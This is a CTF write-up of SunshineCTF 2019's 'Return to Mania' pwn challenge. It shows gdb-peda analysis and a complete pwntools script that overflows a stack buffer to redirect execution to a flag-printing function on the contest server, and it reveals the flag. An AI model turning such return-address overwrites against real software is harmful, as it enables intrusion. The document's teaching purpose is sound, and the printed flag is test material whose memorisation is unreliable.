#PWN
As a word of warning, I'm not all that good at pwn. Luckily, there were only two pwn challenges. 1 out of 2 is good right? T_T
<br>
<br>
## 50 points: Return to Mania
```
To celebrate her new return to wrestling, Captn Overflow authored this challenge to enter the ring

nc ret.sunshinectf.org 4301

Author: bambu
```
<a href='http://files.sunshinectf.org/pwn/return-to-mania'>binary</a>

I started out by just running the file. 

![](/Images/2019/SunshineCTF/retbegin.PNG)

As the description suggested, it's a buffer overflow challenge. And since it gives us an address, it's probably a return pointer overflow. Let's analyze the executable with <a href='https://github.com/longld/peda'>gdb-peda</a>, shall we?

![](/Images/2019/SunshineCTF/gdbfunc.PNG)

I always start by looking at the functions, then disassembling them.

![](/Images/2019/SunshineCTF/retmain.PNG)

![](/Images/2019/SunshineCTF/retwelc.PNG)

![](/Images/2019/SunshineCTF/remania.PNG)

Interesting. `main` calls `welcome`, but `welcome` never calls `mania`, regardless of the key you put in. So `mania` is probably our goal function here, since the title is literally "Return to Mania". But what does `mania` do? It looks like it reads in a file, so I'm hopeful. I set a breakpoint at main, ran the program, and when it broke, set the program counter to the address of mania.

![](/Images/2019/SunshineCTF/maniainteresting.PNG)

Bingo. That's what we want. It tried to open a '`flag.txt`', which means on the service it actually would open the flag. The address of mania is `0x90` less than the address welcome, and hopefully that's the case for the remote version too. Fun fact: I spent a long time trying to figure out why my code didn't work, and it turned out that I originally did my math wrong (I thought it was `0xA0`).

![](/Images/2019/SunshineCTF/addressesret.PNG)

Now what I need to do is to find the offset. I did this using gdb-peda's pattern function. I created a four character function (stand in for the four bytes that the address payload would be) using `pattern create 4`. I then tested different values until `pattern search` found the entire pattern in `eip`, which is the return address pointer.

![](/Images/2019/SunshineCTF/offsetcalc.PNG)

It turned out to be an offset of 22 bytes (`1234567890123456789012`), so I'll need to have 22 characters before the address of mania.

I then proceeded to use good old <a href='https://github.com/Gallopsled/pwntools'>pwntools</a> to start making my hack. Its a bit messy, so I added some comments to help. This was my final code.
```
from pwn import *
context.log_level = 'debug'               #debug mode, so I can see exactly what my code is doing.
r = remote('ret.sunshinectf.org',4301)    #connect to the service
#r = process('./return-to-mania')         #comment out above line and uncomment this one to test locally
data = r.recvuntil('\n')                  #receive the first line, but I don't care about it so...
data = r.recvuntil('\n')                  #overwrite the first line with the second
print data                                #debug print

x = data[-11:]                            #get the address of welcome
x = int(x,0)                              #convert the hex string to an integer
target = x - int('0x90', 0)               #subtract 0x90 from the address (

target = hex(target)                      #convert the address back to hex for debug purposes
print target                              #debug print

target = int(target, 0)                   #convert it back into integer for actual use
print target                              #debug print

target = p32(target, endian='little')     #convert the integer into a 32 bit architecture little endian address
print target                              #debug print, should print utf-8 encoded hex (often has unprintables)
r.sendline('a'*22+target)                 #send the exploit on over! 22 As are used to fill up the offset, and the target address fills the eip, setting the return pointer to be mania
print r.recv()                            #print the first line, had no flag so:
print r.recv()                            #print next line (flag)
```
I ran it locally with success:

![](/Images/2019/SunshineCTF/localtestret.PNG)

And then got the flag from the service:

![](/Images/2019/SunshineCTF/serviceret.PNG)

flag: `sun{0V3rfl0w_rUn_w!Ld_br0th3r}`
<br>
<br>
<br>
## 200 points: CyberRumble (TBA)
